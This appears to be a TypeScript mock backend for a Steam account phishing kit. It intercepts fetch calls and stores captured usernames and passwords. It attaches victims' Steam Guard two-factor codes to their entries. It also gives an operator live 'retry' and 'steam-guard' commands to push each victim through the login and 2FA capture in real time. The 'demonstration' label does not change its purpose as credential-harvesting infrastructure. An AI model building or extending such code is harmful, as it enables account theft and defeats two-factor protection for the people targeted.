
// This file simulates a backend API for the demonstration

// Store for captured credentials
let capturedCredentials: any[] = [];
let adminActions: Record<string, string> = {};
let steamGuardCodes: Record<string, string> = {};

// Mock API response handler
const handleApiRequest = async (url: string, options: RequestInit = {}) => {
  // Simulate network delay
  await new Promise(resolve => setTimeout(resolve, 500));
  
  // Parse the URL to determine the endpoint
  const endpoint = url.split('?')[0];
  
  // Handle different endpoints
  if (endpoint === '/api/store-credentials') {
    const data = JSON.parse(options.body as string);
    capturedCredentials.push({
      ...data,
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      status: 'pending'
    });
    return { success: true };
  }
  
  if (endpoint === '/api/store-steamguard') {
    const data = JSON.parse(options.body as string);
    const code = data.code;
    
    // Find the most recent pending or awaiting_2fa credential and update it
    const pendingCredentials = capturedCredentials.filter(cred => 
      cred.status === 'pending' || cred.status === 'awaiting_2fa'
    );
    
    if (pendingCredentials.length > 0) {
      // Sort by timestamp (descending) to get the most recent
      pendingCredentials.sort((a, b) => 
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );
      
      const mostRecent = pendingCredentials[0];
      
      // Update the credential with the steam guard code
      capturedCredentials = capturedCredentials.map(cred => {
        if (cred.id === mostRecent.id) {
          return {
            ...cred,
            steamguard: code,
            status: 'completed'
          };
        }
        return cred;
      });
    }
    
    return { success: true };
  }
  
  if (endpoint === '/api/check-admin-action') {
    // Extract username from query params
    const params = new URLSearchParams(url.split('?')[1]);
    const username = params.get('username');
    
    if (username && adminActions[username]) {
      const action = adminActions[username];
      // Clear the action after it's been read
      delete adminActions[username];
      return { action };
    }
    return { action: null };
  }
  
  if (endpoint === '/api/get-credentials') {
    return capturedCredentials;
  }
  
  if (endpoint === '/api/set-admin-action') {
    const data = JSON.parse(options.body as string);
    adminActions[data.username] = data.action;
    
    // Update status in capturedCredentials
    capturedCredentials = capturedCredentials.map(cred => {
      if (cred.username === data.username) {
        return {
          ...cred,
          status: data.action === 'retry' ? 'rejected' : 
                 data.action === 'steam-guard' ? 'awaiting_2fa' : cred.status
        };
      }
      return cred;
    });
    
    return { success: true };
  }
  
  // Default fallback
  return { error: 'Endpoint not found' };
};

// Intercept fetch calls and route to our mock API
const originalFetch = window.fetch;
window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = typeof input === 'string' ? input : input.toString();
  
  // Only intercept API calls
  if (url.startsWith('/api/')) {
    try {
      const response = await handleApiRequest(url, init);
      return {
        ok: true,
        status: 200,
        json: async () => response,
        text: async () => JSON.stringify(response)
      } as Response;
    } catch (error) {
      return {
        ok: false,
        status: 500,
        json: async () => ({ error: 'Internal error' }),
        text: async () => JSON.stringify({ error: 'Internal error' })
      } as Response;
    }
  }
  
  // For all other requests, use the original fetch
  return originalFetch(input, init);
};

// Initialize the mock API
export const initMockApi = () => {
  console.log('Mock API initialized');
  
  // Add some initial demo data
  capturedCredentials = [
    {
      id: '1',
      username: 'demo_user',
      password: 'demo_password',
      timestamp: new Date().toISOString(),
      status: 'pending'
    }
  ];
};

export default {
  initMockApi
};
